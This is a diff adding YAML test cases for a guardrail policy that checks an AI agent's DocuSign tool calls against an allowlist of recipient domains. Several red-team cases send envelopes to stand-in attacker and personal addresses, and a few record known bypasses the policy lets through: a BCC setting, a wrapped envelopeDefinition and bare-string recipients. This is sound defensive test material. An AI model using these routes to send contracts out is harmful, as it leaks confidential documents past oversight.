@@ -1,0 +1,499 @@
+- description: Unrelated Docusign read tool (getEnvelope) passes through even when
+    its args happen to contain an external email string.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-getEnvelope
+      uri: null
+    payload:
+      name: docusign-getEnvelope
+      args:
+        envelopeId: 0aa1b2c3-d4e5-f607-1829-3a4b5c6d7e8f
+        note: contact me at someone@gmail.com
+  output:
+    expectedResult: allow
+
+- description: createEnvelope with all recipients.signers on allowlisted domains.
+    Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: MSA for signature
+        status: sent
+        recipients:
+          signers:
+            - email: legal@approved-counterparty.com
+              name: Ada Counterparty
+              routingOrder: "1"
+            - email: deals@yourcompany.com
+              name: Devin Internal
+              routingOrder: "2"
+  output:
+    expectedResult: allow
+
+- description: createEnvelope with one signer at a personal gmail.com address (the
+    "add my personal address as a signer" exfiltration pattern). Policy should deny
+    and name the offending address.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: MSA for signature
+        status: sent
+        recipients:
+          signers:
+            - email: legal@approved-counterparty.com
+              name: Ada Counterparty
+              routingOrder: "1"
+            - email: me.personal@gmail.com
+              name: Me
+              routingOrder: "2"
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'me.personal@gmail.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: createEnvelope with an offending carbonCopies recipient — a CC gets
+    a full copy of the envelope, so non-signer recipient types are checked too.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: SOW for signature
+        status: sent
+        recipients:
+          signers:
+            - email: legal@approved-counterparty.com
+              name: Ada Counterparty
+              routingOrder: "1"
+          carbonCopies:
+            - email: shadow@exfil-domain.net
+              name: Shadow Copy
+              routingOrder: "2"
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'shadow@exfil-domain.net' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: createEnvelope via the template path with an offending templateRoles
+    email. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        templateId: 11aa22bb-33cc-44dd-55ee-66ff77aa88bb
+        status: sent
+        templateRoles:
+          - roleName: Signer 1
+            name: Wrong Party
+            email: contracts@wrong-counterparty.io
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'contracts@wrong-counterparty.io' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: Community (luthersystems) create_envelope_from_template with an
+    offending role_assignments email. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-community-create_envelope_from_template
+      uri: null
+    payload:
+      name: docusign-community-create_envelope_from_template
+      args:
+        template_id: 11aa22bb-33cc-44dd-55ee-66ff77aa88bb
+        email_subject: NDA for signature
+        status: sent
+        role_assignments:
+          - roleName: Signer 1
+            name: Personal Exfil
+            email: myburner@outlook.com
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'myburner@outlook.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: Community create_envelope_from_documents with an offending flat
+    signers[] email (best-effort coverage of the unverified schema). Policy should
+    deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-community-create_envelope_from_documents
+      uri: null
+    payload:
+      name: docusign-community-create_envelope_from_documents
+      args:
+        email_subject: Offer letter
+        status: sent
+        signers:
+          - email: candidate@freemail.example
+            name: Candidate
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'candidate@freemail.example' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: updateEnvelopeRecipients rerouting a pending envelope to an external
+    address via the flat signers[] shape. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-updateEnvelopeRecipients
+      uri: null
+    payload:
+      name: docusign-updateEnvelopeRecipients
+      args:
+        envelopeId: 0aa1b2c3-d4e5-f607-1829-3a4b5c6d7e8f
+        signers:
+          - email: me.personal@gmail.com
+            name: Me
+            recipientId: "2"
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'me.personal@gmail.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: updateEnvelopeRecipients with all signers on allowlisted domains.
+    Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-updateEnvelopeRecipients
+      uri: null
+    payload:
+      name: docusign-updateEnvelopeRecipients
+      args:
+        envelopeId: 0aa1b2c3-d4e5-f607-1829-3a4b5c6d7e8f
+        signers:
+          - email: legal@approved-counterparty.com
+            name: Ada Counterparty
+            recipientId: "1"
+  output:
+    expectedResult: allow
+
+- description: createEnvelope draft with documents only and no recipients anywhere.
+    Nothing can be transmitted, so the call is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: Draft MSA
+        status: created
+        documents:
+          - name: msa.pdf
+            fileExtension: pdf
+            documentBase64: JVBERi0xLjQK
+  output:
+    expectedResult: allow
+
+- description: Malformed recipient email with no @ separator fails closed and is
+    reported as offending.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        recipients:
+          signers:
+            - email: not-an-email-address
+              name: Broken
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'not-an-email-address' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: Recipient email with a repeated @ (embedded-address trick) fails
+    closed and is reported as offending.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        recipients:
+          signers:
+            - email: attacker@evil.com@yourcompany.com
+              name: Trick
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'attacker@evil.com@yourcompany.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: Mixed-case tool name and mixed-case allowlisted domain both match
+    case-insensitively. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: Docusign-CreateEnvelope
+      uri: null
+    payload:
+      name: Docusign-CreateEnvelope
+      args:
+        recipients:
+          signers:
+            - email: Alice@YOURCOMPANY.COM
+              name: Alice
+  output:
+    expectedResult: allow
+
+- description: Two offending recipients produce a single sorted, semicolon-joined
+    reason naming both addresses.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        recipients:
+          signers:
+            - email: attacker@gmail.com
+              name: Attacker
+            - email: rival@rival-corp.com
+              name: Rival
+  output:
+    expectedResult: deny
+    expectedReason: "Docusign recipient 'attacker@gmail.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.; Docusign recipient 'rival@rival-corp.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist."
+
+- description: RED-TEAM (bypass B) — updateEnvelopeRecipients rerouting a copy to an
+    external address via carbonCopies with NO signers. A CC is a full copy of the
+    envelope; the flat top-level sweep must catch every recipient type, not just signers.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-updateEnvelopeRecipients
+      uri: null
+    payload:
+      name: docusign-updateEnvelopeRecipients
+      args:
+        envelopeId: 0aa1b2c3-d4e5-f607-1829-3a4b5c6d7e8f
+        carbonCopies:
+          - email: attacker@evil.com
+            name: Exfil
+            recipientId: "3"
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'attacker@evil.com' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: RED-TEAM (bypass B, allow side) — updateEnvelopeRecipients adding an
+    internal carbonCopies recipient (no signers). The generic top-level sweep must
+    not over-deny an allowlisted CC.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-updateEnvelopeRecipients
+      uri: null
+    payload:
+      name: docusign-updateEnvelopeRecipients
+      args:
+        envelopeId: 0aa1b2c3-d4e5-f607-1829-3a4b5c6d7e8f
+        carbonCopies:
+          - email: records@yourcompany.com
+            name: Records
+            recipientId: "3"
+  output:
+    expectedResult: allow
+
+- description: RED-TEAM (bypass A) — createEnvelope smuggling an external signer
+    through the composite/inline template path. compositeTemplates[].inlineTemplates[].recipients
+    must be swept just like the top-level recipients object.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: MSA via composite template
+        status: sent
+        compositeTemplates:
+          - serverTemplates:
+              - sequence: "1"
+                templateId: 11aa22bb-33cc-44dd-55ee-66ff77aa88bb
+            inlineTemplates:
+              - sequence: "2"
+                recipients:
+                  signers:
+                    - email: attacker@rival-corp.org
+                      name: Smuggled
+                      routingOrder: "1"
+  output:
+    expectedResult: deny
+    expectedReason: Docusign recipient 'attacker@rival-corp.org' has a domain outside the approved counterparty allowlist. Remove this recipient or use an address at an approved counterparty domain. If this is a legitimate counterparty, ask your compliance team to add its domain to the allowlist.
+
+- description: RED-TEAM (bypass A, allow side) — createEnvelope via composite/inline
+    template with an internal signer only. Must be allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: MSA via composite template
+        status: sent
+        compositeTemplates:
+          - inlineTemplates:
+              - sequence: "1"
+                recipients:
+                  signers:
+                    - email: legal@approved-counterparty.com
+                      name: Ada Counterparty
+                      routingOrder: "1"
+  output:
+    expectedResult: allow
+
+- description: RED-TEAM (documented residual) — createEnvelope with an external
+    emailSettings.bccEmailAddresses copy. This nested-under-object BCC-archive shape
+    is a KNOWN LIMITATION and is intentionally NOT inspected; the call is allowed.
+    Documented in Known limitations. Add a dedicated rule if BCC archiving is used.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        emailSubject: MSA for signature
+        status: sent
+        emailSettings:
+          bccEmailAddresses:
+            - email: silentcopy@evil.com
+        recipients:
+          signers:
+            - email: legal@approved-counterparty.com
+              name: Ada Counterparty
+              routingOrder: "1"
+  output:
+    expectedResult: allow
+
+- description: RED-TEAM (documented residual, extraction depth) — createEnvelope
+    that wraps the envelope definition one level deeper under `envelopeDefinition`.
+    Recipients at args.envelopeDefinition.recipients are NOT reached by the sweeps
+    (which look at args.recipients, composite inline recipients, and top-level args
+    arrays), so the external signer is allowed. KNOWN LIMITATION — extend args_obj
+    if your gateway's tools/list shows a wrapped body.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        envelopeDefinition:
+          emailSubject: MSA for signature
+          status: sent
+          recipients:
+            signers:
+              - email: attacker@evil.com
+                name: Smuggled
+                routingOrder: "1"
+  output:
+    expectedResult: allow
+
+- description: RED-TEAM (documented residual, extraction depth) — createEnvelope
+    with a recipient expressed as a bare string instead of an object carrying an
+    `email` field. object.get(entry, "email", "") on a string yields "", so the
+    address is not extracted and the call is allowed. KNOWN LIMITATION — only
+    recipient objects with an `email` field are inspected.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: docusign-createEnvelope
+      uri: null
+    payload:
+      name: docusign-createEnvelope
+      args:
+        recipients:
+          signers:
+            - attacker@evil.com
+  output:
+    expectedResult: allow
